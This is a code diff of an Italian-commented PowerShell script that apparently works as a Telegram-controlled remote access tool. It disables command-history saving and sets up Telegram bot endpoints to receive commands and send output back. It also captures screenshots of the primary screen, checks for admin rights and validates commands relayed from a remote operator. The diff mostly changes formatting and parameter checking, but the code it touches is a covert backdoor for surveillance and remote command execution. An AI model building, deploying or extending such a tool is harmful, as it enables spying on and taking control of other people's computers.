@@ -4,7 +4,7 @@ Set-PSReadlineOption -HistorySaveStyle SaveNothing
 Set-Location -Path $env:USERPROFILE
 
 $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
-$telegram_id, $api_token = "@1", "@2"
+$telegram_id, $api_token  = "@1", "@2"
 $api_get_updates    = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
 $api_send_messages  = 'https://api.telegram.org/bot{0}/SendMessage' -f $api_token
 $api_get_file       = 'https://api.telegram.org/bot{0}/getFile?file_id=' -f $api_token
@@ -36,7 +36,8 @@ function CheckAdminRights()
 }
 
 
-function GetScreenshot {
+function GetScreenshot 
+{
     try {
         SendMessage "Procedo a catturare la schermata..."
         $screen = [System.Windows.Forms.Screen]::PrimaryScreen
@@ -118,39 +119,41 @@ function SendMessage($output)
 
 
 
-function CheckRequiredParameters {
-    param (
-        [string]$CommandString
-    )
-
+function CheckRequiredParameters($CommandString)
+{
     # Dividi la stringa del comando in un array di parole
     $commandParts = $CommandString -split ' '
 
     # Il primo elemento è il nome del comando
     $commandName = $commandParts[0]
 
-    # Ottieni i parametri obbligatori per il comando
-    $requiredParameters = Get-Help -Name $commandName -Parameter * | Where-Object { $_.Required -eq $true -and $_.Position -eq 0 } | Select-Object -ExpandProperty Name
+    # Verifica se è un cmdlet
+    if ((Get-Command $commandName).CommandType -eq 'Cmdlet') {
+        # Ottengo i parametri obbligatori per il comando
+        $requiredParameters = Get-Help -Name $commandName -Parameter * -ErrorAction SilentlyContinue | Where-Object { $_.Required -eq $true -and $_.Position -eq 0 } | Select-Object -ExpandProperty Name
 
-    if ($requiredParameters.Count -eq 0) {
-        Log "Il comando $commandName non ha parametri obbligatori."
-        return $true
-    }
+        if ($requiredParameters.Count -eq 0) {
+            Log "Il comando $commandName non ha parametri obbligatori."
+            return $true
+        }
 
-    # Restringi l'array agli argomenti (escludendo il nome del comando)
-    $arguments = $commandParts[1..$($commandParts.Count - 1)]
+        # Restringo l'array agli argomenti (escludendo il nome del comando)
+        $arguments = $commandParts[1..$($commandParts.Count - 1)]
 
-    # Estrai i nomi dei parametri dagli argomenti
-    $parameterNames = $arguments -match '^[-/]([\w]+)[:=]?' | ForEach-Object { $_ -replace '^[-/]|[:=]$' }
+        # Estraggo i nomi dei parametri dagli argomenti
+        $parameterNames = $arguments -match '^[-/]([\w]+)[:=]?' | ForEach-Object { $_ -replace '^[-/]|[:=]$' }
 
-    # Verifica se i parametri obbligatori sono presenti tra i nomi dei parametri
-    $missingParameters = $requiredParameters | Where-Object { $_ -notin $parameterNames }
+        # Verifico se i parametri obbligatori sono presenti tra i nomi dei parametri
+        $missingParameters = $requiredParameters | Where-Object { $_ -notin $parameterNames }
 
-    if ($missingParameters.Count -gt 0) {
-        SendMessage "Il comando '$commandName' richiede i seguenti parametri obbligatori mancanti: $($missingParameters -join ', ')"
-        return $false
+        if ($missingParameters.Count -gt 0) {
+            SendMessage "Il comando '$commandName' richiede i seguenti parametri obbligatori mancanti: $($missingParameters -join ', ')"
+            return $false
+        } else {
+            Log "Il comando $commandName ha tutti i parametri obbligatori necessari."
+            return $true
+        }
     } else {
-        Log "Il comando $commandName ha tutti i parametri obbligatori necessari."
         return $true
     }
 }
